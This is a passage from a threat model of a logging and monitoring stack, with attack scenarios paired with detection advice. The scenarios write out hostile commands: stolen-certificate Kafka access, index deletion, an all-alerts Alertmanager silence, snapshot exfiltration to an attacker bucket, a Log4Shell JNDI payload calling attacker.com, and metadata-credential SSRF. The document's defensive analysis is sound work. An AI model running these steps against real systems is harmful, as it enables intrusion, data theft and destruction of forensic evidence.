    // user_id, email, ip_address are not returned (PII restriction)
  }
}
```

**Why this matters:** A developer debugging the order service should not be able to query the auth service's logs (which might contain password reset attempts, MFA codes in flight, security events). And they should not see raw PII fields even in their own service's logs. The security team, however, has access to all indices and all fields.

### 5.4 Prometheus Authentication and Authorization

Prometheus itself has minimal native auth. In production, it sits behind a reverse proxy (nginx or Envoy) that handles authentication:

```
Engineer/Grafana → nginx/Envoy (auth proxy)
                     │
                     ├── Verify Bearer token (JWT from Grafana service account)
                     ├── Check allowed PromQL labels
                     │     (e.g., team-A can only query {namespace="team-a-ns"})
                     └── Forward to Prometheus
```

**Prometheus RBAC via Kube RBAC Proxy:** A popular pattern is to deploy `kube-rbac-proxy` as a sidecar next to Prometheus. It intercepts requests, validates Kubernetes RBAC permissions (can this service account `get` this resource?), and forwards valid requests to Prometheus. This reuses Kubernetes RBAC infrastructure without adding a separate auth system.

### 5.5 Service Account Tokens for Automated Access

Monitoring infrastructure (Grafana → Prometheus, Logstash → Elasticsearch) uses service account tokens:

```
Grafana → Elasticsearch (for log queries):
  - Elasticsearch service account with role "grafana-reader"
  - Token stored in Grafana's encrypted secrets store (KMS-backed)
  - Token rotation: every 90 days, automated via Terraform + Vault
  - Token scope: read-only on logs-* indices, no admin operations

Logstash → Elasticsearch (for writing logs):
  - Elasticsearch service account with role "logstash-writer"
  - Permissions: create_index on logs-*, index (write) documents
  - NO delete, NO read (write-only — logstash cannot read back what it wrote)
  - This prevents Logstash compromise from allowing bulk data exfiltration
```

**Principle of least privilege:** The log writer (Logstash/Fluent Bit) can only write. It cannot read back logs. Even if compromised, an attacker using these credentials cannot exfiltrate the full log corpus — they can only write (inject) log events. Separate read credentials are needed for exfiltration, making a complete attack harder.

---

## 6. Data Flow

### 6.1 Log Event Lifecycle: Field-by-Field Transformation

Trace a single log event from application code to Elasticsearch document:

```
Stage 1: Application code
─────────────────────────
logger.error("Payment failed", order_id="ord-8823", user_id="usr-4491")

Stage 2: Structlog/logrus serialization
────────────────────────────────────────
{
  "@timestamp": "2024-01-15T14:32:01.123456Z",  ← added by logging lib
  "level": "error",
  "message": "Payment failed",
  "order_id": "ord-8823",
  "user_id": "usr-4491",
  "logger": "payment",
  "thread": "main",
  "pid": 1234,
  "service": "order-service",   ← from global config (env var SERVICE_NAME)
  "version": "2.3.1",           ← from global config
  "env": "production"            ← from global config
}

Stage 3: Container runtime adds
────────────────────────────────
{
  ... (all above),
  "stream": "stderr",
  "time": "2024-01-15T14:32:01.123456789Z"  ← container runtime timestamp (nanosecond)
}

Stage 4: Fluent Bit adds
──────────────────────────
{
  ... (all above),
  "kubernetes.pod_name": "order-service-7d8f9b-xk2p4",
  "kubernetes.namespace": "production",
  "kubernetes.node_name": "ip-10-0-1-45.ec2.internal",
  "kubernetes.labels.app": "order-service",
  "kubernetes.labels.version": "2.3.1",
  "kubernetes.container_name": "order-service"
}

Stage 5: Logstash filter pipeline
──────────────────────────────────
{
  ... (all above),
  "geoip.city_name": "N/A",            ← no IP in this event
  "event.fingerprint": "sha256-abc123", ← dedup hash
  "tags": ["alert_candidate"],          ← added by conditional filter
  "@metadata._index": "logs-production-2024.01.15"  ← routing metadata
}

Stage 6: Elasticsearch document
────────────────────────────────
{
  "_index": "logs-production-2024.01.15",
  "_id": "sha256-abc123",
  "_source": {
    "@timestamp": "2024-01-15T14:32:01.123456Z",
    "level": "error",
    "message": "Payment failed",
    "order_id": "ord-8823",
    "user_id": "usr-4491",   ← PII — access controlled via Elasticsearch DLS
    "service": "order-service",
    "kubernetes.pod_name": "order-service-7d8f9b-xk2p4",
    ... (all fields)
  }
}
```

**Total enrichment:** The 3-field application log becomes a 20+ field structured document. Each stage adds context that makes the log actionable: you can now correlate by pod, namespace, node, trace ID, and search free-text in the message field.

### 6.2 Trace Propagation: Connecting Logs to Traces

Distributed tracing requires every log event to carry the `trace_id` and `span_id` of the current request. This connects logs to the trace in Jaeger/Tempo.

**How trace IDs flow:**

```
Client Request → API Gateway
  API Gateway generates trace_id: 4bf92f3577b34da6
  API Gateway generates span_id for its span: 00f067aa0ba902b7
  API Gateway logs: { trace_id: "4bf92f...", span_id: "00f067..." }
  
  API Gateway → Order Service (HTTP)
    Outgoing header: traceparent: 00-4bf92f3577b34da6-00f067aa0ba902b7-01
    (W3C Trace Context format: version-trace_id-parent_span_id-flags)
    
  Order Service receives request
    Extracts trace_id from traceparent header
    Generates new span_id for its span: abcdef1234567890
    Sets parent_span_id = 00f067aa0ba902b7 (the API Gateway's span)
    Order Service logs: { trace_id: "4bf92f...", span_id: "abcdef...", parent_span_id: "00f067..." }
    
  Order Service → Payment Service (gRPC)
    gRPC metadata: traceparent: 00-4bf92f3577b34da6-abcdef1234567890-01
```

**Result:** Searching Kibana for `trace_id: 4bf92f3577b34da6` returns ALL log lines from ALL services for this single request — API gateway, order service, payment service, database queries — all linked by the same trace ID. You can then open this trace_id in Jaeger to see the full timing waterfall.

### 6.3 Metrics Data Flow: Exposition to Storage

```
Application process (in memory)
  Counter: http_requests_total{method="GET",status="200"} = 8923
  ↑ Incremented by application code on every request
  
Prometheus scrape (every 15s)
  GET /metrics → returns current counter values
  Prometheus computes: rate over last scrape interval = (8923 - 8900) / 15s = 1.53 req/s
  Prometheus stores: (timestamp=T, value=8923) for this series
  
Prometheus TSDB compression
  Series: {http_requests_total, method=GET, status=200, service=order-service}
  Samples: [(T1,8900), (T2,8923), (T3,8945), ...]
  XOR-encoded chunk: stored in 12 bytes per sample (vs 16 bytes raw)
  
Thanos Sidecar (for long-term storage)
  Every 2 hours: uploads completed Prometheus blocks to S3
  Format: Prometheus TSDB block format (same as local, but on S3)
  Thanos Querier: can query across current Prometheus (last 2h) + S3 (historical)
  
PromQL query at query time
  rate(http_requests_total{method="GET",status="200",service="order-service"}[5m])
  → Thanos Querier routes to correct store
  → Decompresses relevant chunks
  → Computes rate across matching time range
  → Returns [{timestamp, value}, ...]
```

### 6.4 Log Serialization Format Comparison

| Format | Size | Parse Speed | Schema | Human Readable | Use Case |
|--------|------|-------------|--------|----------------|----------|
| JSON | 1× | Medium | Dynamic | Yes | Default, flexible |
| NDJSON | 1× | Medium | Dynamic | Yes | Bulk API |
| logfmt | 0.7× | Fast | Dynamic | Yes | Simple structured logs |
| Protobuf | 0.3× | Very Fast | Required | No | Internal transport |
| Avro | 0.3× | Very Fast | Required (Schema Registry) | No | Kafka at scale |
| OTLP | 0.3× | Very Fast | Defined by OTel spec | No | OpenTelemetry ecosystem |
| Parquet (columnar) | 0.1× | Very Fast for analytics | Required | No | Cold storage, batch analytics |

**Why Parquet for cold storage?** A log line has 20 fields. A full-text query searches only the `message` field. In row-based storage (JSON files), reading the `message` field requires reading all 20 fields. In columnar storage (Parquet), only the `message` column is read from disk — 95% less I/O for single-field queries. For Athena/BigQuery analytics on 1 year of logs, columnar makes the difference between a $5 query and a $500 query.

---

## 7. Security Controls

### 7.1 The Unique Security Challenge: Logs Contain Everything

The logging system is a high-value target:
- It stores ALL log data from ALL services
- Logs frequently contain PII (user IDs, emails, IP addresses), business data (order IDs, amounts), and security events (auth failures, access patterns)
- Logs are the primary forensic evidence for security investigations — an attacker who can modify or delete logs can cover their tracks
- The logging pipeline has network access to ALL services (to receive their logs)

This makes the logging system both a target AND a critical forensic asset.

### 7.2 Encryption In Transit

```
Connection                    Protocol    Mutual Auth    Notes
─────────────────────────────────────────────────────────────────────────────
App stdout → container log    N/A         N/A            Local file, no network
Container log → Fluent Bit    inotify     N/A            Local IPC, no network
Fluent Bit → Kafka            TLS 1.3     mTLS           Client cert per node
Fluent Bit → Logstash         TLS 1.3     mTLS           Client cert per node
Kafka inter-broker            TLS 1.3     mTLS           Broker client certs
Logstash → Elasticsearch      TLS 1.3     mTLS           Service account cert
Prometheus → Targets          TLS 1.3     Optional       Depends on target config
Grafana → Prometheus          TLS 1.3     Bearer token   Service account JWT
Grafana → Elasticsearch       TLS 1.3     API key        Scoped service account
Browser → Grafana             TLS 1.3     Session cookie SSO-backed
Browser → Kibana              TLS 1.3     Session cookie SSO-backed
Alertmanager → PagerDuty      TLS 1.3     API key        External SaaS
```

### 7.3 Encryption At Rest

| Storage Component | Encryption Method | Key Management |
|------------------|------------------|----------------|
| Kafka log segments | AES-256 via broker-level encryption or filesystem encryption | LUKS (Linux) or KMS-managed |
| Elasticsearch indices | AES-256 at-rest encryption (X-Pack) | Elasticsearch keystore + KMS |
| S3 cold storage | SSE-KMS (AES-256, KMS-managed per-object keys) | AWS KMS CMK |
| Prometheus TSDB | Filesystem encryption (LUKS or EBS encryption) | AWS KMS |
| Grafana config DB (SQLite/PostgreSQL) | Database-level encryption | AES-256 |

**Keystore rotation for Elasticsearch:** Elasticsearch encrypts its encryption keys with a keystore password. The actual data keys are stored encrypted in the keystore. Rotating the keystore password does NOT require re-encrypting all data — only the keystore itself is re-encrypted. This is envelope encryption: `data_key` encrypted by `master_key` stored in keystore encrypted by `password`.

### 7.4 Tamper Evidence: Protecting Log Integrity

Logs used as evidence in security investigations must be tamper-evident. An attacker who compromises a system should not be able to retroactively remove or modify log records.

**Approach 1: Append-only storage**
Kafka topics are append-only by design — consumers cannot delete or modify records, only the retention policy (time or size) can delete. For compliance, set `log.retention.hours=-1` (infinite retention) for audit topics, with size-based archival to S3.

**Approach 2: Write-once S3 (Object Lock)**
S3 Object Lock in COMPLIANCE mode prevents deletion or overwrite for a specified retention period — even by the root AWS account. Log files uploaded to this bucket cannot be tampered with.
```
aws s3api put-object-lock-configuration \
  --bucket audit-logs-immutable \
  --object-lock-configuration 'ObjectLockEnabled=Enabled,Rule={DefaultRetention={Mode=COMPLIANCE,Years=7}}'
```

**Approach 3: Cryptographic chaining**
Each log event includes: `hash_of_previous_event + timestamp + content → SHA-256`. This creates a blockchain-like structure where modifying any past event invalidates all subsequent hashes. A separate verification process periodically re-hashes the chain. If the hash doesn't match, tampering is detected.

**Who can write (and the risk):** Fluent Bit on every node can write to the Kafka topic. If a node is compromised, the attacker can inject fabricated log events (e.g., delete real security events from their malicious activity, inject fake events to create noise). The log injection attack is covered in Section 9.

### 7.5 PII Handling in Logs

Logs inevitably contain PII. This creates legal obligations (GDPR, CCPA: right to deletion, data minimization) that conflict with the operational need for logs.

**Strategy 1: Tokenization at collection**
Before logs reach Elasticsearch, replace PII fields with reversible tokens:
```
user_id: "usr-4491" → user_id: "tok-sha256(usr-4491 + daily_salt)"
email: "alice@example.com" → email: "REDACTED"
```
Operations team can correlate by token. Security team (with salt) can reverse tokens. GDPR deletion is satisfied by deleting the salt (all tokens become unresolvable).

**Strategy 2: Field-level masking at Elasticsearch**
Only specific roles can see PII fields (as described in Section 5.3). All others see `REDACTED` in those fields. The data is stored but access-controlled.

**Strategy 3: Log scrubbing in the pipeline**
Logstash `gsub` filter removes patterns matching credit card numbers (Luhn algorithm), SSNs (regex), emails, etc.:
```
mutate {
  gsub => [
    "message", "\b[0-9]{16}\b", "CARD_REDACTED",
    "message", "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b", "EMAIL_REDACTED"
  ]
}
```
**Risk:** Regex scrubbing is imprecise. It may miss obfuscated formats and may redact non-PII that matches the pattern.

### 7.6 Secrets Handling in the Monitoring Stack

**Never store secrets in:**
- Prometheus scrape config files (target URLs with credentials)
- Alertmanager config files (PagerDuty API keys)
- Grafana datasource config files (database passwords)
- Kubernetes ConfigMaps (unencrypted, any pod in the namespace can read)
- Environment variables baked into container images

**Store secrets in:**
- Kubernetes Secrets (base64 encoded, but encrypted at rest via KMS if configured)
- Vault (HashiCorp) — dynamic secrets, audit trail, fine-grained access control
- External Secrets Operator — syncs Vault/AWS SSM secrets into Kubernetes Secrets automatically

**Prometheus scrape credentials example using Kubernetes Secret:**
```yaml
# prometheus-scrape-config.yml (no secrets inline)
scrape_configs:
  - job_name: 'order-service'
    scheme: https
    tls_config:
      ca_file: /etc/prometheus/tls/ca.crt
    basic_auth:
      username_file: /etc/prometheus/secrets/username  # Mounted from K8s Secret
      password_file: /etc/prometheus/secrets/password  # Mounted from K8s Secret
    static_configs:
      - targets: ['order-service.production:8080']
```

---

## 8. Attack Surface Mapping

### 8.1 Full Attack Surface Diagram

```
╔══════════════════════════════════════════════════════════════════════════════════════╗
║  EXTERNAL ATTACK SURFACE                                                             ║
╠══════════════════════════════════════════════════════════════════════════════════════╣
║                                                                                      ║
║  [A] Grafana web UI (HTTPS, SSO-backed)                                             ║
║      • Dashboard manipulation (unauthorized alert modification)                      ║
║      • SSRF via datasource configuration                                             ║
║      • Grafana plugin vulnerabilities                                                ║
║      • Session hijacking via stolen SSO cookie                                       ║
║                                                                                      ║
║  [B] Kibana web UI (HTTPS, SSO-backed)                                              ║
║      • Elasticsearch data exfiltration via search API                                ║
║      • Kibana CSRF for data modification                                             ║
║                                                                                      ║
║  [C] Prometheus HTTP API (internal, exposed to Grafana)                             ║
║      • PromQL injection (read-only API but expensive queries = DoS)                  ║
║      • Configuration file exposure via /config endpoint                              ║
║      • Target enumeration via /targets endpoint                                      ║
║                                                                                      ║
║  [D] Alertmanager HTTP API (internal)                                               ║
║      • Silence creation (suppress legitimate alerts to hide attacks)                 ║
║      • Alert deletion                                                                ║
║      • Webhook modification                                                          ║
║                                                                                      ║
║  [E] Log ingestion endpoint (mTLS-protected, Kafka/Logstash)                        ║
║      • Log injection from compromised node                                           ║
║      • Log volume amplification (DoS the pipeline)                                  ║
║      • Schema poisoning (malformed events breaking consumers)                        ║
╚══════════════════════════════════════════════════════════════════════════════════════╝

          │ mTLS / JWT / SSO / Firewall
          ▼

╔══════════════════════════════════════════════════════════════════════════════════════╗
║  INTERNAL ATTACK SURFACE                                                             ║
╠══════════════════════════════════════════════════════════════════════════════════════╣
║                                                                                      ║
║  [F] Kafka brokers                                                                   ║
║      • Broker ACL misconfiguration (any topic readable/writable)                     ║
║      • Kafka Admin API (create/delete topics, alter configs)                         ║
║      • Consumer group offset manipulation (skip events)                              ║
║      • Zookeeper/KRaft (leader election — compromise → full Kafka control)           ║
║                                                                                      ║
║  [G] Elasticsearch cluster                                                           ║
║      • Index deletion (destroy all logs)                                             ║
║      • Snapshot exfiltration                                                         ║
║      • Kibana saved objects (dashboard/alert configuration)                          ║
║      • ILM policy manipulation (accelerate deletion of forensic logs)                ║
║                                                                                      ║
║  [H] Fluent Bit agents (on every node)                                              ║
║      • Path traversal in file tail config (read arbitrary files on node)             ║
║      • Config injection (forward logs to attacker-controlled endpoint)               ║
║      • Container escape — agent has volume mounts to host filesystem                 ║
║                                                                                      ║
║  [I] Cold storage (S3 bucket)                                                       ║
║      • Bucket misconfiguration (public read)                                         ║
║      • Lifecycle policy manipulation (delete old logs = destroy evidence)            ║
║                                                                                      ║
║  [J] Vault / secrets store                                                           ║
║      • Monitoring credentials exposed = all monitoring systems compromised           ║
║                                                                                      ║
║  [K] Kubernetes RBAC                                                                 ║
║      • Excessive service account permissions                                         ║
║      • Fluent Bit DaemonSet has host volume mounts — escape = node compromise       ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
```

### 8.2 Trust Boundaries

```
════════════════════════════════════════════════════════════════════════════
ZONE: Producer/Node Level (each node is its own trust domain)
  Each node's Fluent Bit agent is trusted to report that node's logs.
  A compromised node can only inject logs for that node's identity.
  Logs from that node are TAINTED and should be correlated with host IDS.
  
  Trust assertion: mTLS client cert identifies the node
  Scope of compromise: logs from one node (not all nodes)
  
════════════════════════════════════════════════════════════════════════════
ZONE: Transport (Kafka)
  Trusted to store and deliver events durably.
  Does NOT validate log content — trusts producers.
  Kafka ACLs restrict which clients can write to which topics.
  
  Trust assertion: Kafka ACL (SASL/SCRAM or mTLS)
  Scope of compromise: all data for accessible topics
  
════════════════════════════════════════════════════════════════════════════
ZONE: Storage (Elasticsearch)
  Trusted to store, index, and return events.
  X-Pack security controls who can query which data.
  Document-level security prevents cross-team data access.
  
  Trust assertion: Elasticsearch API key + DLS
  Scope of compromise: all indexed data (highest value target)
  
════════════════════════════════════════════════════════════════════════════
ZONE: Query/Alerting (Grafana, Prometheus, Alertmanager)
  Human-accessible layer. SSO-backed.
  Read-only for most users. Admin access tightly controlled.
  
  Trust assertion: SSO session + RBAC role
  Scope of compromise: visibility into all monitored data
════════════════════════════════════════════════════════════════════════════
```

---

## 9. Attack Scenarios (Very Detailed)

### 9.1 Attack: Log Injection to Erase Evidence of a Breach

**Attacker assumptions:**
- Attacker has achieved RCE (remote code execution) on one application pod
- That pod runs Fluent Bit with mTLS credentials available on the filesystem
- The attacker wants to remove evidence of their initial access from the log stream

**Step-by-step execution:**

1. Attacker gains RCE on `order-service-7d8f9b-xk2p4` via a deserialization vulnerability in the order processing code.

2. Attacker explores the pod filesystem:
   ```bash
   cat /var/lib/fluent-bit/client.crt   # mTLS certificate
   cat /var/lib/fluent-bit/client.key   # mTLS private key
   env | grep KAFKA                     # Kafka bootstrap servers
   ```

3. Using the mTLS credentials, the attacker connects directly to the Kafka broker as if they were a legitimate Fluent Bit agent:
   ```bash
   # Install kafkacat / kcat tool
   kcat -b kafka.kafka.svc.cluster.local:9093 \
     -X security.protocol=SSL \
     -X ssl.certificate.location=/tmp/client.crt \
     -X ssl.key.location=/tmp/client.key \
     -X ssl.ca.location=/tmp/ca.crt \
     -L  # List topics and metadata
   ```

4. Attacker cannot modify existing Kafka messages (append-only). Instead, they inject a high volume of fake log events to drown out the real attack evidence:
   ```json
   {"timestamp":"2024-01-15T14:30:00Z","level":"info","service":"order-service","message":"Normal request processed","order_id":"ord-fake-9999","pod":"order-service-7d8f9b-xk2p4"}
   ```
   Attacker floods the topic with 100,000 fake events per second. The real attack-indicating events are buried.

5. Alternatively, attacker finds a Logstash or consumer configuration (perhaps in a ConfigMap accessible to the pod) that specifies a filter. If they can modify the Logstash config to add a filter that drops events matching their pod name, those events never reach Elasticsearch.

6. Even more targeted: if the attacker can access the Elasticsearch service account credentials (common mistake: stored in env vars of the application container), they can directly delete the index containing today's logs:
   ```bash
   curl -X DELETE https://elasticsearch:9200/logs-production-2024.01.15 \
     -H "Authorization: ApiKey <stolen-key>"
   ```

**Where detection could happen:**
- **Unusual Kafka producer activity:** The compromised pod's Fluent Bit agent normally produces ~100 events/second. Suddenly it's producing 100,000/second. Rate anomaly alert fires.
- **Direct Kafka connection from unexpected source:** Fluent Bit only connects from specific IPs (the node's IP). A connection from the pod's internal IP (not the node's IP) to Kafka is anomalous. Network policy should block this.
- **Elasticsearch API calls from unexpected IP/credential:** The order-service application should never call the Elasticsearch API. A Kubernetes network policy should block pods in the `production` namespace from reaching the `logging` namespace.
- **Host IDS (Falco):** Falco detects `execve` of `kcat` or `curl` inside the order-service container — containers should not run arbitrary binaries. Falco rule fires: "Unexpected executable run in container."
- **mTLS certificate anomaly:** The mTLS certificate for `node-ip-10-0-1-45` is now being used from two simultaneous connections (the real Fluent Bit agent AND the attacker's process). Certificate-based anomaly detection triggers.

**Why this works:**
- mTLS credentials are typically stored accessible within the container or on the host filesystem (accessible to any process on the node)
- Network policies between namespaces are often missing or overly permissive
- Applications and logging infrastructure run in the same cluster with shared network access

---

### 9.2 Attack: Alertmanager Silence Abuse to Suppress Security Alerts

**Attacker assumptions:**
- Attacker has gained access to Grafana/Alertmanager admin credentials (via stolen SSO session, credential stuffing, or compromised service account)
- They are planning a sustained attack and want to operate without triggering alerts

**Step-by-step execution:**

1. Attacker identifies that Alertmanager's API is accessible at `https://alertmanager.internal.example.com`. This URL is often accessible to all authenticated internal users.

2. Attacker authenticates (using stolen session or internal service credentials) and calls the Alertmanager API to create a silence:
   ```bash
   curl -X POST https://alertmanager.internal.example.com/api/v2/silences \
     -H "Authorization: Bearer {stolen-token}" \
     -H "Content-Type: application/json" \
     -d '{
       "matchers": [
         {"name": "alertname", "value": ".*", "isRegex": true}
       ],
       "startsAt": "2024-01-15T00:00:00Z",
       "endsAt": "2024-01-22T00:00:00Z",
       "createdBy": "maintenance-team",
       "comment": "Planned maintenance window"
     }'
   ```

3. This creates a silence that suppresses ALL alerts (regex `.*` matches everything) for 7 days. Any alert that fires during the attacker's operation period is silenced — the on-call team receives no pages.

4. The attacker now executes their main attack (data exfiltration, lateral movement, ransomware staging) without triggering any monitoring alerts.

5. Alertmanager dutifully silences every alert that fires. Engineers checking the silence list would see it, but nobody is actively watching silence creation events.

**Where detection could happen:**
- **Audit log of Alertmanager API calls:** Every API call to Alertmanager should be logged. A silence creation covering ALL alertnames is extremely unusual and should immediately trigger an out-of-band notification (e.g., an email to security team, separate from Alertmanager-managed alerts).
- **Grafana alerting on Alertmanager silence creation:** Configure a Grafana alert that fires when a new silence is created (query Alertmanager's API for active silences, alert if count > N or if a silence has regex matchers). This alert should route through a separate notification path that is NOT silenceable by Alertmanager.
- **Out-of-band monitoring:** A separate, independent monitoring system (external SaaS like Datadog, or a second Alertmanager instance) that monitors the health of the primary Alertmanager and alerts if all alerts are suddenly silenced.
- **Scheduled silence audit:** Daily job that lists all active silences and sends a report. An unexpected week-long silence covering all alerts would be immediately visible.

**Why this works:**
- Alertmanager's API is often not separately protected from the UI — same credentials grant API access
- Silence creation is rarely audited or monitored
- The attack is socially engineered: "Planned maintenance window" sounds legitimate
- Most teams don't have a secondary alert path for "the alerting system itself is compromised"

---

### 9.3 Attack: Elasticsearch Data Exfiltration via Overprivileged Grafana Account

**Attacker assumptions:**
- Attacker has compromised a Grafana admin account (via phishing)
- Grafana has the Elasticsearch datasource configured
- The Grafana-Elasticsearch service account has read access to all log indices

**Step-by-step execution:**

1. Attacker logs into Grafana using the compromised admin credentials (or SSO session if they've also compromised the victim's SSO).

2. Attacker navigates to **Grafana Explore** (ad-hoc query interface). Selects the Elasticsearch datasource.

3. Instead of normal log queries, attacker crafts a query that matches all documents for data exfiltration:
   ```json
   {
     "query": { "match_all": {} },
     "size": 10000,
     "_source": ["user_id", "email", "order_id", "amount", "ip_address", "message"]
   }
   ```

4. Grafana sends this query to Elasticsearch via its datasource proxy, using its service account credentials. Elasticsearch returns up to 10,000 documents.

5. Attacker uses Grafana's export functionality (or repeatedly queries with different time ranges) to download all log data.

6. More efficiently: if Grafana is configured with a datasource that has Elasticsearch snapshot privileges, the attacker can trigger a snapshot of the entire indices to an S3 bucket they control:
   ```
   PUT /_snapshot/my-attacker-repo
   { "type": "s3", "settings": { "bucket": "attacker-bucket", ... } }
   POST /_snapshot/my-attacker-repo/full-snapshot
   ```
   The full log corpus is now in the attacker's S3 bucket.

**Where detection could happen:**
- **Grafana query audit log:** Every query executed in Grafana Explore is logged. A `match_all` query against all indices is anomalous — real engineers query for specific services/time ranges.
- **Elasticsearch query anomaly detection:** Elasticsearch X-Pack ML can detect anomalous query patterns — a user who normally queries 100 documents/hour suddenly querying 1,000,000 documents.
- **Data volume anomaly:** Grafana's response sizes are normally < 1MB per query (for chart rendering). A 100MB response from Elasticsearch to Grafana is anomalous.
- **DLP (Data Loss Prevention):** Network-level DLP monitoring egress from the Grafana pod can detect unusually large data transfers.
- **Elasticsearch audit log:** All search operations are logged in Elasticsearch's audit log with the service account that executed them. If the Grafana service account executes a `match_all` with `size=10000`, this is logged.

**Why this works:**
- Grafana admins have access to the datasource proxy — any query they can express in the UI, Grafana will proxy to the backend
- The Elasticsearch service account is often over-privileged (easier to configure `read` on all indices than to set up fine-grained permissions)
- Data exfiltration via UI looks like legitimate user activity from the network perspective

---

### 9.4 Attack: Log Volume Amplification DoS (Log4Shell Analogy)

**Attacker assumptions:**
- Attacker can send HTTP requests to an application that logs request data
- The application logs the User-Agent header or other request fields without truncation
- The logging pipeline's Logstash has JNDI lookup or similar execution capability (Log4Shell scenario)

**Step-by-step execution (Log4Shell variant applied to logging pipeline):**

1. Attacker sends an HTTP request to the target application with a crafted header:
   ```
   User-Agent: ${jndi:ldap://attacker.com/exploit}
   ```

2. The application (using Log4j 2.x < 2.16.0) logs the User-Agent string: `logger.info("Request received, UA: " + userAgent)`. Log4j interpolates the `${jndi:ldap://...}` expression, makes an outbound LDAP connection to `attacker.com`, downloads a malicious Java class, and executes it within the application process.

3. Even without Log4Shell specifically: a `User-Agent` of 10MB (maximum HTTP header size) sent to an application that logs the full User-Agent causes a 10MB log event. The logging pipeline must serialize, compress, transport, and index 10MB instead of the normal ~500B.

4. Attacker sends 10,000 such requests/second: 100GB/second of log data floods the pipeline. Fluent Bit's disk buffer fills, it drops new events (real logs from real requests are lost). Kafka's disk fills. Elasticsearch indexing backs up. Alert: "Elasticsearch indexing lag > 1 hour."

5. During this DoS window, the attacker executes their real attack — knowing that alert detection via logs is impaired.

**Where detection could happen:**
- **Log event size limit:** Fluent Bit, Logstash, and Kafka producer all have configurable maximum message sizes. Fluent Bit: `Buffer_Chunk_Size` and `Buffer_Max_Size`. Kafka producer: `max.request.size`. Events exceeding the limit are truncated or dropped with a warning.
- **Rate limiting at the application:** WAF limits User-Agent header size (e.g., 8KB max).
- **Log pipeline anomaly:** Kafka throughput doubling in 30 seconds triggers an alert.
- **Circuit breaker in Fluent Bit:** If the downstream (Kafka) is slow, Fluent Bit applies backpressure. If the backpressure exceeds the memory buffer, it drops events and increments a metric (`fluentbit_output_errors_total`). This metric spikes.

**Why this works:**
- Applications logging arbitrary user-controlled input without size limiting is extremely common
- The logging pipeline is designed for high throughput but not for sudden 1000× spikes
- Log-based DoS is often not in the threat model

---

### 9.5 Attack: PromQL Injection / Expensive Query DoS

**Attacker assumptions:**
- Attacker has read access to Grafana (valid but low-privilege account)
- Grafana's Explore interface allows arbitrary PromQL queries
- Prometheus has no query complexity limiting (common in self-managed setups)

**Step-by-step execution:**

1. Attacker uses Grafana Explore to execute a carefully crafted PromQL query designed to be maximally expensive:
   ```promql
   sum by (pod, container, namespace, node, service, version, env, label1, label2)(
     rate(container_cpu_usage_seconds_total[30d])
   ) / sum by (pod, container, namespace, node, service, version, env, label1, label2)(
     rate(container_cpu_usage_seconds_total[30d])
   )
   ```

   This query:
   - Uses a 30-day range window → forces Prometheus to decompress 30 days × 24h × 60min/15s = 172,800 samples per series
   - Uses many `by` labels → high-cardinality result set
   - Divides the result by itself → redundant computation

2. Prometheus receives the query. Its query engine begins evaluating. For a cluster with 10,000 pods × 10 containers × 4 metrics = 400,000 series, each needing 172,800 samples loaded: this is 69 billion sample operations. Prometheus blocks its query goroutine.

3. Prometheus has limited query concurrency (default: 20 concurrent queries). The attacker runs 20 concurrent instances of this query. All 20 goroutines are blocked evaluating expensive queries.

4. Legitimate scraping continues but alerting queries queue up. Alertmanager can't get fresh data. Alert evaluation delays by minutes. Real issues go undetected.

5. Prometheus may OOM-kill: loading 30 days of data per-series into memory for 400,000 series requires terabytes of memory → OS OOM killer terminates Prometheus → all metrics and alerting are down until Prometheus restarts and replays its WAL (which could take 30+ minutes).

**Where detection could happen:**
- **Prometheus query timeout (`--query.timeout=2m`):** Queries exceeding 2 minutes are aborted. Attacker gets a timeout error, Prometheus is protected.
- **Grafana datasource timeout:** Grafana has its own timeout for datasource queries (default 30s). Long-running queries time out before they can cause damage.
- **Query audit log:** Grafana logs all PromQL queries. A query with a 30-day range is anomalous — engineers rarely query >24 hours.
- **Prometheus `--query.max-samples` flag:** Limits the total number of samples a single query can process. Exceeding the limit returns an error.

**Why this works:**
- Prometheus has no built-in query complexity analysis before execution
- The query syntax is powerful (functions, ranges, aggregations) and easy to abuse
- Most teams do not configure query timeouts or sample limits

---

### 9.6 Attack: SSRF via Grafana Datasource Configuration

**Attacker assumptions:**
- Attacker has Grafana admin access (compromised admin account or default credentials)
- Grafana can connect to arbitrary URLs (datasource configuration)
- Internal services are accessible from the Grafana pod (no egress restrictions)

**Step-by-step execution:**

1. Grafana's datasource configuration allows an admin to specify any URL for a datasource (Prometheus URL, Elasticsearch URL, InfluxDB URL, etc.).

2. Attacker navigates to Grafana → Configuration → Data Sources → Add data source.

3. Attacker configures a new "Prometheus" datasource with URL: `http://169.254.169.254/latest/meta-data/` (AWS instance metadata service).

4. Attacker clicks "Save & Test." Grafana sends an HTTP request from the Grafana pod to `169.254.169.254`. The instance metadata service returns metadata.

5. Attacker queries the "datasource" via Grafana Explore. For each query field, Grafana constructs a URL and makes a request. By crafting queries that map to specific metadata paths, the attacker retrieves:
   - IAM role name: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - IAM credentials (AccessKeyId, SecretAccessKey, Token): `http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}`

6. Grafana renders the metadata response as if it were Prometheus data. The attacker reads the IAM credentials from Grafana's Explore response.

7. Using the IAM credentials, the attacker has access to all AWS services the Grafana role can access: S3 (for log exports), CloudWatch, potentially RDS or other databases.

**Where detection could happen:**
- **IMDSv2 enforcement:** AWS can enforce IMDSv2, which requires a `PUT` request with a session token before `GET` requests succeed. Grafana's HTTP client only does `GET` → metadata service returns 401. Simple mitigation.
- **Egress network policy:** Kubernetes NetworkPolicy preventing the Grafana pod from reaching 169.254.169.254 or any IP outside the approved list.
- **Datasource URL validation:** Grafana should validate that datasource URLs resolve to allowed IP ranges (not RFC 1918, not link-local).
- **Grafana audit log:** Adding a new datasource is logged. An unfamiliar URL would stand out in a review.

---

## 10. Failure Points

### 10.1 Failures Under Load

**Fluent Bit — backpressure cascade:**

When the downstream (Kafka/Logstash) is slow, Fluent Bit's output plugin blocks. Its internal memory buffer fills. Fluent Bit stops reading from the tail input. The container log file grows (the container runtime is still writing). Eventually, the node's disk fills with log files. The container runtime fails to write new log entries. Application processes writing to stdout block on the kernel write call (if the pipe buffer is full). The application **stops processing requests** — a logging failure has cascaded into an application outage.

Fix: Configure Fluent Bit with disk-backed buffering (`storage.type filesystem`) so it doesn't drop data when memory fills. Set `storage.total_limit_size` to prevent disk exhaustion. Configure log rotation on the host so container log files don't grow unbounded.

